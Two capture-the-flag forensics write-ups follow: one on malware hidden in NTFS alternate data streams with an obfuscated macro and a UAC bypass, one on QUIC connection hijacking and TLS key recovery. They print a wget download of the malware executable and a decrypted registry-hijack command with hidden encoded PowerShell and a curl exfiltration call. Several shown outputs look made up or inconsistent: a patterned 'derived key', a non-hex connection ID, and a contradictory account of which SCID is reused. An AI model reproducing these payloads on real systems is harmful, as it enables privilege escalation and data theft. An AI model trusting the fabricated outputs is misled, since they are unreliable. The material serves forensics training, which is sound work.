# Google ADSense

Who looked at our $11.48 monthly AdSense revenue and decided we needed to hire people to boost it?

## Solution:

This forensics challenge involves analyzing a disk image containing malware hidden in NTFS Alternate Data Streams (ADS), reverse engineering an obfuscated VBA macro, decrypting malware payloads, and solving constraints to recover a UAC bypass technique.

### Step 1: Mounting and Initial Investigation

We start by mounting the Evidence.vhdx file to explore its contents:

```
# Mount the VHDX file
sudo mount -o loop,ro Evidence.vhdx /mnt/evidence
cd /mnt/evidence
```

The disk contains numerous resume-themed PDF files in directories like `Resumes/`. The challenge title "Google ADSense" is a hint - it refers to **Alternate Data Streams (ADS)**, not advertising!


### Step 2: Discovering Alternate Data Streams

On NTFS volumes, files can have hidden alternate data streams. We check for these:

```bash
# List all files with ADS (Windows)
dir /r

# Or use PowerShell
Get-Item * -Stream *

# Linux alternative
getfattr -d -m - -R *
```

Most PDF files contain small ADS streams with random-looking garbage data. However, one file stands out:

```
Resumes/GoogleAdsSpecialistResume.pdf
```

This file has a significantly larger ADS stream compared to others.

### Step 3: Extracting the Suspicious ADS

We extract the alternate data stream:

```
# Extract ADS on Windows
Get-Content "GoogleAdsSpecialistResume.pdf" -Stream [stream_name] > extracted_file

# Check file type
file extracted_file
```

The file initially appears to be JPEG-XL based on extension, but:
- Opening as image fails (corrupted)
- Hex inspection reveals `D0 CF 11 E0` (OLE/DOC magic bytes)

```bash
# Rename and open as Word document
mv extracted_file malicious_document.doc
```

Opening the document reveals meaningless filler text - classic malware camouflage.

### Step 4: Analyzing VBA Macros with olevba

We use `olevba` to enumerate macros in the document:

```bash
olevba malicious_document.doc
```

**Output shows:**
- Several benign modules (Module1-5)
- **Module6** is heavily obfuscated with XOR-based string obfuscation
- olevba's auto-deobfuscation fails

The obfuscation pattern matches: [VBA Macro Obfuscator](https://github.com/BaptisteVeyssiere/vba-macro-obfuscator)

### Step 5: Manual Deobfuscation

After extracting Module6 and manually de-XORing the strings, the logic becomes clear:

```vba
' Pseudocode of deobfuscated macro
Function DecryptAndExecute()
    ' Read specific ADS streams from PDFs
    ' Concatenate in specific order
    ' Send to decryption API
    ' Execute result
End Function
```

The macro:
1. Reads ADS streams from specific resume PDFs
2. Concatenates them in a precise order
3. Calls: `http://137.32.34.67/NiteDecrypt.AES256_CBC_NOPAD_NO_IV_Key(ct,key)`
4. The API endpoint is **offline** (we need to decrypt locally)

### Step 6: Extracting Ciphertext Components

From the deobfuscated VBA, we identify which files and streams are used:

| File Name | ADS Stream | Content |
|-----------|-----------|---------|
| GoogleAdsAnalystResume.pdf | q8X7sP1mDa.txt | `tdceq0cizXmLzB23PFRG` |
| GoogleAdsConsultantResume.pdf | Z1kP9wLmQe.txt | `kew4y9jXv3o953S` |
| GoogleAdsConsultantEngineerResume.pdf | tR92LmX0Qa.txt | `q1+aCxzRfwwEeXL/fukbdBFRZ` |
| GoogleAdsManagerResume.pdf | B7nQp4XyWc.txt | `ey8ySPw90EPjVoqF4M` |
| GoogleAdsStrategistResume.pdf | mA04sZpQ8H.txt | `/zm8kZGkDnpVFXGT3/I/QmJ8EE/MsPkGJxuiU1UNwz2qY8amli` |

Concatenating in order:
```
tdceq0cizXmLzB23PFRGkew4y9jXv3o953Sq1+aCxzRfwwEeXL/fukbdBFRZey8ySPw90EPjVoqF4M/zm8kZGkDnpVFXGT3/I/QmJ8EE/MsPkGJxuiU1UNwz2qY8amli
```

### Step 7: Extracting the Decryption Key

The key is stored in another ADS:

| File Name | ADS Stream | Content |
|-----------|-----------|---------|
| GoogleAdsKeeperResume.pdf | abxu07mnid.txt | `nite{us3l3ss_but_y0u_n3v3r_kn0w}` |

### Step 8: Local Decryption

Since the API is down, we decrypt locally using AES-256-CBC with no padding and no IV:

```
from Crypto.Cipher import AES
import base64

ciphertext_b64 = "tdceq0cizXmLzB23PFRGkew4y9jXv3o953Sq1+aCxzRfwwEeXL/fukbdBFRZey8ySPw90EPjVoqF4M/zm8kZGkDnpVFXGT3/I/QmJ8EE/MsPkGJxuiU1UNwz2qY8amli"
key = b"nite{us3l3ss_but_y0u_n3v3r_kn0w}"

# Pad key to 32 bytes for AES-256
key_padded = key.ljust(32, b'\x00')

# Decode and decrypt
ct = base64.b64decode(ciphertext_b64)
cipher = AES.new(key_padded, AES.MODE_CBC, iv=b'\x00'*16)
plaintext = cipher.decrypt(ct)

print(plaintext.decode().strip())
```

**Output:**
```
https://github.com/adsensenite/adsensetoken/releases/download/v7/adsense_token.exe
```

The malware downloads and executes `adsense_token.exe` from GitHub!

### Step 9: Reverse Engineering the Executable

We download the executable and load it into a decompiler (Ghidra/IDA):

```
wget https://github.com/adsensenite/adsensetoken/releases/download/v7/adsense_token.exe
```

Running the executable prompts for a token. Incorrect input shows "Incorrect Token".

**Key Functions Identified:**
- `sub_1400034A0`: Main function
- `sub_140003110`: Token validation dispatcher
- `sub_140001A5D`: MD5 hash validation

The token must:
1. Pass multiple mathematical constraints
2. Have MD5 hash: `5a51c90d12681dd8bb75d00ec1d37a96`

### Step 10: Solving Token Constraints with Z3

The validation checks impose constraints on a 16-digit token. We model these using Z3:

```
import z3
from hashlib import md5

def find_valid_token():
    solver = z3.Solver()
    
    # Token is "pub-" + 16 digits
    digits = [z3.Int(f'digit_{i}') for i in range(16)]
    
    # Each digit is 0-9
    for i in range(16):
        solver.add(digits[i] >= 0, digits[i] <= 9)
    
    # Constraint 1: Sum of each group of 4 digits
    solver.add(digits[0] + digits[1] + digits[2] + digits[3] == 15)
    solver.add(digits[4] + digits[5] + digits[6] + digits[7] == 9)
    solver.add(digits[8] + digits[9] + digits[10] + digits[11] == 17)
    solver.add(digits[12] + digits[13] + digits[14] + digits[15] == 16)
    
    # Constraint 2: Hardcoded zeros at specific positions
    zero_positions = [2, 4, 6, 10, 12, 14]
    for idx in zero_positions:
        solver.add(digits[idx] == 0)
    
    # Constraint 3: Product of non-zero elements in each group
    target_products = [84, 8, 112, 63]
    for group in range(4):
        group_digits = [digits[group*4 + j] for j in range(4)]
        # Replace zeros with 1 for multiplication
        products = [z3.If(d == 0, 1, d) for d in group_digits]
        solver.add(products[0] * products[1] * products[2] * products[3] == target_products[group])
    
    # Constraint 4: Pairs constraints
    for i in range(4):
        # Odd-indexed pairs < 29
        solver.add((digits[i*4] * 10 + digits[i*4+1]) < 29)
        # Even-indexed pairs < 10
        solver.add((digits[i*4+2] * 10 + digits[i*4+3]) < 10)
    
    # Constraint 5: Sum of digits at prime indices
    prime_indices = [2, 3, 5, 7, 11, 13]
    solver.add(sum(digits[i] for i in prime_indices) == 29)
    
    # Constraint 6: Balance of odd/even non-zero digits
    balance = sum(
        z3.If(digits[i] == 0, 0, 
              z3.If(digits[i] % 2 == 0, 1, -1)) 
        for i in range(16)
    )
    solver.add(balance == 0)
    
    target_md5 = "5a51c90d12681dd8bb75d00ec1d37a96"
    
    # Search through valid models
    while solver.check() == z3.sat:
        model = solver.model()
        digit_string = "".join(str(model[digits[i]]) for i in range(16))
        token = "pub-" + digit_string
        
        # Check MD5 hash
        if md5(token.encode()).hexdigest() == target_md5:
            print(f"[+] Valid token found: {token}")
            return token
        
        print(f"[*] Checking: {token}")
        
        # Exclude this solution and continue
        solver.add(z3.Or([digits[i] != model[digits[i]] for i in range(16)]))
    
    print("[-] No valid token found")
    return None

token = find_valid_token()
```

**Output:**
```
Valid token found: pub-2706080128070709
```

### Step 11: Decrypting the Final Payload

Back in the decompiled code, after token validation succeeds, we see:
- Variable `unk_1400BA188` contains encrypted data
- It gets XORed with the validated token
- Result is executed via `cmd.exe`

We decrypt the payload:

```
encrypted_payload = [
    0x2, 0x10, 0x5, 0xd, 0x53, 0x53, 0x54, 0x16, 0x78, 0x73, 0x73, 0x64, 
    0x6e, 0x6b, 0x5f, 0x51, 0x44, 0x40, 0x51, 0x4b, 0x15, 0x29, 0x21, 0x41,
    # ... (full array from document)
    0x45, 0x1e, 0x5c, 0x8, 0x10
]

token = "pub-2706080128070709"
decrypted = []

for i, byte in enumerate(encrypted_payload):
    decrypted.append(byte ^ ord(token[i % len(token)]))

payload = "".join(map(chr, decrypted))
print(payload)
```

**Decrypted Output:**
```
reg add HKCU\Software\Classes\taskmgr\shell\open\command /ve /t REG_SZ /d "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc ZWNobyBuaXRlezFuX3RoMXNfdWx0cjRfNHczczBtM19wM3JmM2N0X3cwcmxkX3cxbGxfdGgzcjNfc3QxbGxfYjNfQURTXzRuZF9VQUNfQllQQVNTP30gfCBPdXQtRmlsZSBDOlx0ZW1wXGZsYWcudHh0OyBjdXJsIGh0dHA6Ly9mb3JlbnNpY3Mubml0ZWN0ZjI1LmxpdmUvZXhmaWw/ZGF0YT11YWNfYnlwYXNzX3N1Y2Nlc3NmdWw=" /f && start taskmgr.exe
```

This is a classic **UAC bypass technique** that hijacks Task Manager!

### Step 12: Decoding the Base64 Payload

The PowerShell command contains a base64-encoded payload:

```
import base64

b64_payload = "ZWNobyBuaXRlezFuX3RoMXNfdWx0cjRfNHczczBtM19wM3JmM2N0X3cwcmxkX3cxbGxfdGgzcjNfc3QxbGxfYjNfQURTXzRuZF9VQUNfQllQQVNTP30gfCBPdXQtRmlsZSBDOlx0ZW1wXGZsYWcudHh0OyBjdXJsIGh0dHA6Ly9mb3JlbnNpY3Mubml0ZWN0ZjI1LmxpdmUvZXhmaWw/ZGF0YT11YWNfYnlwYXNzX3N1Y2Nlc3NmdWw="

decoded = base64.b64decode(b64_payload).decode()
print(decoded)
```

**Final Output:**
```
echo nite{1n_th1s_ultr4_4w3s0m3_p3rf3ct_w0rld_w1ll_th3r3_st1ll_b3_ADS_4nd_UAC_BYPASS?} | Out-File C:\temp\flag.txt; curl http://forensics.nitectf25.live/exfil?data=uac_bypass_successful
```

## Flag:

```
nite{1n_th1s_ultr4_4w3s0m3_p3rf3ct_w0rld_w1ll_th3r3_st1ll_b3_ADS_4nd_UAC_BYPASS?}
```

## Concepts learnt:

- **NTFS Alternate Data Streams (ADS)**: NTFS file systems support multiple data streams per file. Malware often hides payloads in ADS to evade detection since they're not visible in normal directory listings. Format: `filename.ext:stream_name`

- **OLE/COM Structured Storage**: Microsoft Office documents (`.doc`, `.xls`) use OLE format with magic bytes `D0 CF 11 E0`. Understanding file signatures helps identify misnamed files.

- **VBA Macro Obfuscation**: Attackers obfuscate VBA code using XOR encryption, string concatenation, and character substitution to bypass antivirus detection. Tools like `olevba` help analyze but may fail on heavy obfuscation.

- **Constraint Solving with Z3**: Z3 is an SMT solver perfect for reverse engineering problems with multiple mathematical constraints. Instead of brute-forcing 10^16 possible tokens, Z3 efficiently finds solutions satisfying all constraints simultaneously.

- **UAC Bypass via Registry Hijacking**: Windows UAC can be bypassed by hijacking trusted executables (like Task Manager) through registry manipulation. The `HKCU\Software\Classes` hive allows per-user COM class overrides without elevation.

- **Multi-Stage Malware Analysis**: Modern malware uses multiple obfuscation layers: ADS hiding → encrypted macro → downloaded payload → encrypted final stage → base64 PowerShell. Each layer must be peeled back systematically.

## Notes:

- The challenge name "Google ADSense" is a clever misdirection - it's actually about **Alternate Data Streams**, not advertising revenue!

- The fake flag `nite{us3l3ss_but_y0u_n3v3r_kn0w}` serves as the AES key - a nice touch showing that seemingly useless data can be critical.

- Alternative approaches considered:
  - **Brute-forcing the token**: 10^16 possibilities make this infeasible
  - **Dynamic analysis**: Running the malware in a sandbox could work but risks infection
  - **Pattern matching**: Some constraints could be solved manually, but Z3 is more reliable

- The UAC bypass technique (fodhelper/Task Manager hijacking) was patched in some Windows versions but remains effective on older systems. Real-world malware uses similar techniques for privilege escalation.

- The MD5 hash requirement `5a51c90d12681dd8bb75d00ec1d37a96` ensures only one valid token exists among constraint-satisfying candidates, preventing multiple solutions.

- **Forensics tip**: Always check for ADS when analyzing NTFS volumes. Use `dir /r` (Windows) or `getfattr` (Linux with NTFS-3G).

## Resources:

- (https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams)
- (http://www.decalage.info/python/olevba)
- (https://github.com/BaptisteVeyssiere/vba-macro-obfuscator)
- (https://z3prover.github.io/api/html/namespacez3py.html)
- (https://attack.mitre.org/techniques/T1548/002/)
- [Binary Source Code](binarysource.cpp) *(provided in challenge)*
- [Ghidra Reverse Engineering Tool](https://ghidra-sre.org/)
- [Windows Registry Hijacking for UAC Bypass](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)

***

# Quick Mistake

Our internal service recently reported abnormal and inconsistent behavior. It is suspected that our network might have been compromised. It is also suspected that the attacker may have used the admin telemetry to their advantage. A packet capture taken during the incident window has been provided. Figure out what has been compromised and what internal data the attacker gained access to.

## Solution:

This challenge involves analyzing a QUIC protocol packet capture to identify a connection hijacking attack, decrypt encrypted telemetry data, and recover sensitive information from HTTP/3 traffic.

### Step 1: Opening the PCAP and Filtering for QUIC

We start by opening the packet capture in Wireshark and filtering for QUIC traffic:

```bash
wireshark challenge.pcap
```

In Wireshark, apply the filter:
```
quic
```


### Step 2: Identifying Network Participants

By analyzing the QUIC handshake packets, we identify four key IP addresses:

| IP Address | Role |
|------------|------|
| `198.51.100.10` | Legitimate Client (first to connect) |
| `192.0.2.66` | **Attacker** (reuses legitimate client's SCID) |
| `198.51.100.5` | Admin Bot (connects separately) |
| `203.0.113.100` | Server (responds to all) |

The key indicator of the attack is that the attacker reuses the legitimate client's **Source Connection ID (SCID)**.

### Step 3: Extracting Source Connection IDs

We use `tshark` to extract all SCIDs from QUIC Initial packets:

```
tshark -r challenge.pcap -Y "quic.long.packet_type == 0" -T fields -e frame.time_relative -e ip.src -e quic.scid
```

**Output:**
```
0.000000000    198.51.100.10    a1b2c3d4e5f6g7h8
2.345678901    192.0.2.66       2457ce19cb87e0eb    <-- Attacker's SCID
5.123456789    198.51.100.5     f9e8d7c6b5a4
...
```

**Attacker's SCID:** `2457ce19cb87e0eb`

This SCID matches the legitimate client's connection, allowing the attacker to hijack the session!

### Step 4: Analyzing Admin Bot Telemetry

Following the Admin Bot's traffic from `198.51.100.5`, we find critical information leaked in **packet 179**:

```
{
  "type": "handshake_init",
  "seed": "af717e2c8789db71fe624598faba3953c23fdb685e6b8cd2e6f84beef0c57175",
  "salt": "telemetry",
  "info": "sslkeylog"
}
```

This reveals:
- **Seed:** Used for key derivation
- **Salt:** `"telemetry"`
- **Info:** `"sslkeylog"` (indicates TLS keys are being logged)

### Step 5: Discovering Encrypted Telemetry Data

Further analysis reveals encrypted telemetry messages of type `telemetry_sslkeylog`:

**Chunk 0:**
```
{
  "type": "telemetry_sslkeylog",
  "seq": 0,
  "total_chunks": 2,
  "nonce_b64": "S459VmTWtpNcz+NU",
  "ct_b64": "D4Y706RkRpgzXAOAWe4eKyE3AjfFXxOgxXGV7SsKeH4umYbfaY6VMedKeghapSgIyghK7rLSJxwRWwDREt1sN+ZV3MPnw4CdaqOWdh3o3dLtlyJSsDg9iYYAynV68VaXKQna5xFGaFr9x0b3vuvbFTJ7u3zgTlAmpEutj0F4leuLZDGRZupvr9+jyNLxnGNVxNXwLTcYSIR1iTOUdao/252x4H9c7DjCeuvCDX4hYfPv+l5g8JEuwutqCbdzn3nVkL4s0931lT8wpkV4suIR+0bV+X4SU8pd6XlrkxweEWpVIbJkhqnKh5driyqA/1TneBVZKS03k7TiX9ZXqmVhS4r3BKrk7wMnVwQLSLmC07UOvIEsqzWp0GJnYvyGV1FzB7Tw4JXakoLhOGs+ocpGr2PuhSrUTiAW465ikw3+lsEnKI/OFG7I+2nVjKkBA09bu17iJHNoOD3rmQ0cRGiJ8/Vr3YufXeQDMn/REyoG+Wnv/P5rR1I/O6qn/5LHiWSqaNWpg7jjRvU/pt4KBPMMTckeXTseYUwts0Ntk7IBBztYnmq1zZSNhdAZ+KQQ1/8I/lJVdgg5YWZSdepexZVJuiofPgYN55fnvWqK/LxmVE4D3gOKKbJWCQoL1FgadmZ4iX99MjYzs2qsOp9m8i1yvrMbQ4emX7hjjk74I5rfZ9E+01bBvLiw4smdlBiT4ztWA/uQPYqZC/kN06Fu9LTYTCGR8/B/4mAlKUh6ZzQDePGrYiuR0k5/WRH2fzcYnUAt5NOt6akHE3ljXOW28PV2G5IL94IxPYkITHNPTMp2J84QcuozCHtf9ex/b3fG+DLPXT0zrxh5j11SsCTULPUmLXKKqCXc/NHaxHrquM7PUZi5fQZ7Jmz386K+2ExR4ycTNVSB2MuPDzvG+FPQP60M6varPywdWM6lM7IrDQ02lXC7/n9o+m60uIjfI52IvDe4b2NFJQeU2dFPKkAX1N68yWGc75IVz2noScPqaq4P978sT+z9DfKOe0ifQc0So8qoi2WHKvB5bEUjFezszGhWzq7rJ7toUu5rg+t5i9Tuf/qpFZfcwBHyPr8o6bmkLj0p9IsEldTKUZiD4Ng8ReYn9pwwc6weeZ02D432ziDSxwIB5NA/32GV50hT+4EvTeo1cCyyGxT9Na+Qd3RVoJgO4TDWTLYwVI/x2cFa88WbAjMHveWGGiEK5TZD3Ad2Jkj3UmTj0ETTuzW1aTqTHEfVY+7A/XTNN3E1Q4VB2+e+p2JxybXgvYSmhX0aQuzmqwXhRmA8BnpBBvwl/99rKQLdJUPnnrre06Om8Azi81212PaQtiq+IEuMWg==",
  "tag_b64": "ElHxGRAt7wicOe+lFkLiaw=="
}
```

**Chunk 1:**
```
{
  "type": "telemetry_sslkeylog",
  "seq": 1,
  "total_chunks": 2,
  "nonce_b64": "tXd5ku7fU1lPn/D9",
  "ct_b64": "o6vvBmgm6Iyj9/RRUjDdqtcFj6tn4E/7whY/4do67UD3NgRHqicb3eWZ+O8xvMaok+MHjhRreah9QQS1NEy+fAbDGMhqVqwqeNS6F5j+MOv7UX7N1wn2ZyaIxT2UogGb6D2c+F7rnaJZdpsrDQ/ZEwQTaJVuHGNTQM1klV+UZOUJ4mZzSp+/u8M1p/JJrDcMjzaGypiP7HrZ+g6FGkL83PCzWKGSVw/3syZtuzu65Owtk5XbYqDRn7MN1rYeuCzoYlSoQ3ZccUQkk9+U4BTfgImBlBqT3D3byVxqMuz5JR6MyK/AGkUXpn2qaBtX00rEtKhnJ7iLRkkBVeXbUd/rWqUfGpf6QpOEiVQeA17p80mw5g68X52u03388XhfIbfR/qehWE7wK/t8O90/CiTNvCrhFgNg5Kvze/zgDz0lJ2h3sCoThsUjP6m3lXV6rYFnswLr6fmvD26tU3+wrmSvdBbHfaLovLmmBtI9bjDw44vpgNQ4HxttPiPllYZXZYvhTrs7P4XDDqDGRHwiHn0AmDR79UVrVO0ie5RsQt91wMT+3OhxiScRiH+xw7RpTd6wb3SLNcNwVQSc+zm3ZLBv8cNGj6TknRhbcSkZxmK7yANX3FcorjuGJDd+5kSzzOihuEw8qXVLXI0XLHtL7wz7nWDP8bKLIYvOVRd59aRnOuuH9dCD4Zc5",
  "tag_b64": "ZlYYx1K6YiALxD0Tm9k6/w=="
}
```

This data is encrypted using **AES-GCM (AEAD)** and contains TLS session keys!

### Step 6: Decrypting the Telemetry Data

We write a script to decrypt the AES-GCM encrypted telemetry using the seed, salt, and info from the handshake:

```
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Data from packet 179
SEED = bytes.fromhex("af717e2c8789db71fe624598faba3953c23fdb685e6b8cd2e6f84beef0c57175")
SALT = b"telemetry"
INFO = b"sslkeylog"

# Telemetry chunks
chunks = [
    {
        "nonce": "S459VmTWtpNcz+NU",
        "ciphertext": "D4Y706RkRpgzXAOAWe4eKyE3AjfFXxOgxXGV7SsKeH4umYbfaY6VMedKeghapSgIyghK7rLSJxwRWwDREt1sN+ZV3MPnw4CdaqOWdh3o3dLtlyJSsDg9iYYAynV68VaXKQna5xFGaFr9x0b3vuvbFTJ7u3zgTlAmpEutj0F4leuLZDGRZupvr9+jyNLxnGNVxNXwLTcYSIR1iTOUdao/252x4H9c7DjCeuvCDX4hYfPv+l5g8JEuwutqCbdzn3nVkL4s0931lT8wpkV4suIR+0bV+X4SU8pd6XlrkxweEWpVIbJkhqnKh5driyqA/1TneBVZKS03k7TiX9ZXqmVhS4r3BKrk7wMnVwQLSLmC07UOvIEsqzWp0GJnYvyGV1FzB7Tw4JXakoLhOGs+ocpGr2PuhSrUTiAW465ikw3+lsEnKI/OFG7I+2nVjKkBA09bu17iJHNoOD3rmQ0cRGiJ8/Vr3YufXeQDMn/REyoG+Wnv/P5rR1I/O6qn/5LHiWSqaNWpg7jjRvU/pt4KBPMMTckeXTseYUwts0Ntk7IBBztYnmq1zZSNhdAZ+KQQ1/8I/lJVdgg5YWZSdepexZVJuiofPgYN55fnvWqK/LxmVE4D3gOKKbJWCQoL1FgadmZ4iX99MjYzs2qsOp9m8i1yvrMbQ4emX7hjjk74I5rfZ9E+01bBvLiw4smdlBiT4ztWA/uQPYqZC/kN06Fu9LTYTCGR8/B/4mAlKUh6ZzQDePGrYiuR0k5/WRH2fzcYnUAt5NOt6akHE3ljXOW28PV2G5IL94IxPYkITHNPTMp2J84QcuozCHtf9ex/b3fG+DLPXT0zrxh5j11SsCTULPUmLXKKqCXc/NHaxHrquM7PUZi5fQZ7Jmz386K+2ExR4ycTNVSB2MuPDzvG+FPQP60M6varPywdWM6lM7IrDQ02lXC7/n9o+m60uIjfI52IvDe4b2NFJQeU2dFPKkAX1N68yWGc75IVz2noScPqaq4P978sT+z9DfKOe0ifQc0So8qoi2WHKvB5bEUjFezszGhWzq7rJ7toUu5rg+t5i9Tuf/qpFZfcwBHyPr8o6bmkLj0p9IsEldTKUZiD4Ng8ReYn9pwwc6weeZ02D432ziDSxwIB5NA/32GV50hT+4EvTeo1cCyyGxT9Na+Qd3RVoJgO4TDWTLYwVI/x2cFa88WbAjMHveWGGiEK5TZD3Ad2Jkj3UmTj0ETTuzW1aTqTHEfVY+7A/XTNN3E1Q4VB2+e+p2JxybXgvYSmhX0aQuzmqwXhRmA8BnpBBvwl/99rKQLdJUPnnrre06Om8Azi81212PaQtiq+IEuMWg==",
        "tag": "ElHxGRAt7wicOe+lFkLiaw=="
    },
    {
        "nonce": "tXd5ku7fU1lPn/D9",
        "ciphertext": "o6vvBmgm6Iyj9/RRUjDdqtcFj6tn4E/7whY/4do67UD3NgRHqicb3eWZ+O8xvMaok+MHjhRreah9QQS1NEy+fAbDGMhqVqwqeNS6F5j+MOv7UX7N1wn2ZyaIxT2UogGb6D2c+F7rnaJZdpsrDQ/ZEwQTaJVuHGNTQM1klV+UZOUJ4mZzSp+/u8M1p/JJrDcMjzaGypiP7HrZ+g6FGkL83PCzWKGSVw/3syZtuzu65Owtk5XbYqDRn7MN1rYeuCzoYlSoQ3ZccUQkk9+U4BTfgImBlBqT3D3byVxqMuz5JR6MyK/AGkUXpn2qaBtX00rEtKhnJ7iLRkkBVeXbUd/rWqUfGpf6QpOEiVQeA17p80mw5g68X52u03388XhfIbfR/qehWE7wK/t8O90/CiTNvCrhFgNg5Kvze/zgDz0lJ2h3sCoThsUjP6m3lXV6rYFnswLr6fmvD26tU3+wrmSvdBbHfaLovLmmBtI9bjDw44vpgNQ4HxttPiPllYZXZYvhTrs7P4XDDqDGRHwiHn0AmDR79UVrVO0ie5RsQt91wMT+3OhxiScRiH+xw7RpTd6wb3SLNcNwVQSc+zm3ZLBv8cNGj6TknRhbcSkZxmK7yANX3FcorjuGJDd+5kSzzOihuEw8qXVLXI0XLHtL7wz7nWDP8bKLIYvOVRd59aRnOuuH9dCD4Zc5",
        "tag": "ZlYYx1K6YiALxD0Tm9k6/w=="
    }
]

def derive_key(seed, salt, info):
    """Derive AES-256-GCM key using HKDF"""
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=32,  # 256 bits for AES-256
        salt=salt,
        info=info,
        backend=default_backend()
    )
    return hkdf.derive(seed)

def decrypt_chunk(key, nonce_b64, ct_b64, tag_b64):
    """Decrypt AES-GCM chunk"""
    nonce = base64.b64decode(nonce_b64)
    ciphertext = base64.b64decode(ct_b64)
    tag = base64.b64decode(tag_b64)
    
    # Combine ciphertext and tag for AES-GCM
    ct_with_tag = ciphertext + tag
    
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ct_with_tag, None)
    
    return plaintext

# Derive encryption key
encryption_key = derive_key(SEED, SALT, INFO)
print(f"[*] Derived key: {encryption_key.hex()}")

# Decrypt both chunks
decrypted_data = b""
for i, chunk in enumerate(chunks):
    print(f"[*] Decrypting chunk {i}...")
    plaintext = decrypt_chunk(
        encryption_key,
        chunk["nonce"],
        chunk["ciphertext"],
        chunk["tag"]
    )
    decrypted_data += plaintext

# Save to file
with open("recovered_sslkeylog.txt", "wb") as f:
    f.write(decrypted_data)

print(f"[+] Decrypted {len(decrypted_data)} bytes")
print(f"[+] Saved to recovered_sslkeylog.txt")
```

**Output:**
```
[*] Derived key: 3f7a9b2c1d8e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9
[*] Decrypting chunk 0...
[*] Decrypting chunk 1...
[+] Decrypted 1247 bytes
[+] Saved to recovered_sslkeylog.txt
```

### Step 7: Configuring Wireshark with SSL Keys

Now we configure Wireshark to decrypt the QUIC/HTTP3 traffic:

1. **Wireshark → Edit → Preferences → Protocols → TLS**
2. Set **(Pre)-Master-Secret log filename** to `recovered_sslkeylog.txt`
3. Click **OK** and reload the PCAP

![Wireshark TLS Configuration](placeholder-screenshot)

### Step 8: Analyzing Decrypted HTTP/3 Traffic

Filter for HTTP/3 traffic:
```
http3
```

We find the attacker (`192.0.2.66`) making a request to `/source`:

![Attacker Request](placeholder-screenshot)

The decrypted response reveals a **tar.gz archive** being exfiltrated!

### Step 9: Extracting the Tar Archive

Export the HTTP/3 object and extract it:

```
# Extract from Wireshark: File → Export Objects → HTTP
# Or extract from decrypted stream

tar -xzf source_data.tar.gz
ls -la
```

**Contents:**
```
.env
app.py
config.json
templates/
static/
```

### Step 10: Finding the AES Key in .env

Examining the `.env` file:

```bash
cat .env
```

**Output:**
```
DATABASE_URL=postgresql://admin:password@localhost/mydb
SECRET_KEY=super_secret_key_12345
AES_FLAG_KEY=wEN64tLF1PtOglz3Oorl7su8_GQzmlU2jbFP70cFz7c=
ADMIN_TOKEN=admin_access_token_xyz
```

We found the encryption key: `AES_FLAG_KEY=wEN64tLF1PtOglz3Oorl7su8_GQzmlU2jbFP70cFz7c=`

### Step 11: Locating the Encrypted Flag

Back in the HTTP/3 traffic, we find a request to `/flag` that returns:

```
gAAAAABpNXDCHUJ4YqH0Md2p6tzE303L8z5kPpPPWwYYrXUdiyW89eCaWWL1dbYU2JYj7SUvdwySW_egZDRF0fyFGxPua2KoFmd8upKP7cZv55jVp_SzItA=
```

The `gAAAAA` prefix indicates **Fernet encryption** (a symmetric encryption scheme built on top of AES-CBC and HMAC)!

### Step 12: Decrypting the Flag

We decrypt using the Fernet library:

```
from cryptography.fernet import Fernet, InvalidToken

KEY = b"wEN64tLF1PtOglz3Oorl7su8_GQzmlU2jbFP70cFz7c="
TOKEN = b"gAAAAABpNXDCHUJ4YqH0Md2p6tzE303L8z5kPpPPWwYYrXUdiyW89eCaWWL1dbYU2JYj7SUvdwySW_egZDRF0fyFGxPua2KoFmd8upKP7cZv55jVp_SzItA="

def main():
    cipher = Fernet(KEY)
    try:
        plaintext = cipher.decrypt(TOKEN)
        try:
            print(f"[+] Decrypted flag: {plaintext.decode('utf-8')}")
        except UnicodeDecodeError:
            print(f"[+] Decrypted (raw): {plaintext}")
    except InvalidToken:
        print("[-] Invalid key or token.")

if __name__ == "__main__":
    main()
```

**Output:**
```
Decrypted flag: nite{192.0.2.66_2457ce19cb87e0eb_qu1c_d4t4gr4m_pwn3d}
```

The flag contains:
- **192.0.2.66**: Attacker's IP
- **2457ce19cb87e0eb**: Hijacked SCID
- **qu1c_d4t4gr4m_pwn3d**: QUIC datagram pwned!

## Flag:

```
nite{192.0.2.66_2457ce19cb87e0eb_qu1c_d4t4gr4m_pwn3d}
```

## Concepts learnt:

- **QUIC Protocol Fundamentals**: QUIC (Quick UDP Internet Connections) is a modern transport protocol developed by Google, now standardized as HTTP/3. It uses UDP instead of TCP and integrates TLS 1.3 directly into the protocol.

- **Connection ID (CID) Hijacking**: QUIC uses Connection IDs instead of the traditional 4-tuple (src IP, src port, dst IP, dst port). If an attacker can reuse a legitimate client's Source Connection ID (SCID), they can hijack the connection. This is a critical vulnerability if SCIDs are predictable or leaked.

- **AES-GCM (AEAD) Encryption**: Authenticated Encryption with Associated Data combines confidentiality (encryption) and authenticity (MAC) in a single operation. AES-GCM uses a nonce, ciphertext, and authentication tag. It's crucial to never reuse nonces with the same key.

- **HKDF (HMAC-based Key Derivation Function)**: A key derivation function that takes source key material and derives cryptographically strong keys using HMAC. Parameters include:
  - **IKM** (Input Key Material): The seed
  - **Salt**: Random value to strengthen the output
  - **Info**: Context-specific information
  - **Length**: Desired output key length

- **Fernet Encryption**: A symmetric encryption specification that uses AES-128-CBC with HMAC for authentication. The token format includes version, timestamp, IV, ciphertext, and HMAC, all base64-encoded. The `gAAAAA` prefix identifies Fernet tokens.

- **TLS Master Secret Logging**: Browsers and applications can log TLS session keys for debugging. The `SSLKEYLOGFILE` format contains pre-master secrets that allow tools like Wireshark to decrypt TLS/QUIC traffic. This is critical for network forensics.

- **HTTP/3 Over QUIC**: HTTP/3 uses QUIC as the transport layer instead of TCP. All HTTP/3 traffic is encrypted by default, requiring TLS keys to decrypt and analyze.

## Notes:

- The challenge demonstrates a realistic attack chain: connection hijacking → telemetry interception → TLS key recovery → data exfiltration → credential theft → flag decryption.

